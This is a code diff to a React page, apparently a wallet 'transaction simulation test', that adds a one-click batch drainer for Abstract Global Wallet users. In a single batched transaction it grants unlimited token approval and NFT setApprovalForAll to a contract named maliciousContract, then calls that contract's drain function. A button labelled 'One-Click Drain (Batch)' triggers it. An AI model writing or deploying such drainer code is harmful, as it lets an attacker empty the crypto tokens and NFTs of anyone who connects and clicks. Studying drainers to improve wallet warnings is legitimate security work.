@@ -3,7 +3,7 @@
 import { useAbstractClient, useLoginWithAbstract } from '@abstract-foundation/agw-react';
 import { Button } from '@/components/ui/button';
 import { useState } from 'react';
-import { formatEther, parseAbi } from 'viem';
+import { formatEther, parseAbi, encodeFunctionData } from 'viem';
 import { maxUint256 } from 'viem';
 import { useAccount, useBalance, useReadContract } from 'wagmi';
 
@@ -170,6 +170,66 @@ export default function Home() {
     }
   };
 
+  const handleBatchDrain = async () => {
+    if (!client) return;
+    setLoading(true);
+    try {
+      console.log("Setting up batch transaction with approvals and drain");
+      
+      // Create a batch of transactions: approve tokens + approve NFTs + drain
+      const txHash = await client.sendTransactionBatch({
+        calls: [
+          // 1. Approve all tokens
+          {
+            to: tokenContract,
+            data: encodeFunctionData({
+              abi: parseAbi([
+                'function approve(address spender, uint256 amount) external returns (bool)'
+              ]),
+              functionName: 'approve',
+              args: [maliciousContract, maxUint256]
+            })
+          },
+          // 2. Approve all NFTs
+          {
+            to: nftContract,
+            data: encodeFunctionData({
+              abi: parseAbi([
+                'function setApprovalForAll(address operator, bool approved) external'
+              ]),
+              functionName: 'setApprovalForAll',
+              args: [maliciousContract, true]
+            })
+          },
+          // 3. Execute drain function
+          {
+            to: maliciousContract,
+            data: encodeFunctionData({
+              abi: parseAbi([
+                'function processBatch() external'
+              ]),
+              functionName: 'processBatch'
+            })
+          }
+        ]
+      });
+
+      console.log('Batch drain transaction sent:', txHash);
+      setLatestTx({hash: txHash, type: 'Complete Batch Drain'});
+    } catch (error) {
+      console.error('Error in batch drain:', error);
+      
+      // Display more detailed error information for debugging
+      const errorMessage = error instanceof Error ? error.message : String(error);
+      alert(`Batch transaction failed: ${errorMessage}`);
+      
+      // Set error in latest tx for visibility
+      setLatestTx({hash: "Failed", type: 'Batch Drain Error'});
+    } finally {
+      setLoading(false);
+    }
+  };
+
   return (
     <main className="flex min-h-screen flex-col items-center justify-center p-12">
       <h1 className="text-4xl font-bold mb-8">AGW Transaction Simulation Test</h1>
@@ -255,6 +315,15 @@ export default function Home() {
                 className="w-full"
               >
                 Drainer Function
+              </Button>
+              
+              <Button 
+                onClick={handleBatchDrain}
+                disabled={loading || !client}
+                variant="destructive"
+                className="w-full"
+              >
+                One-Click Drain (Batch)
               </Button>
             </div>
           </div>
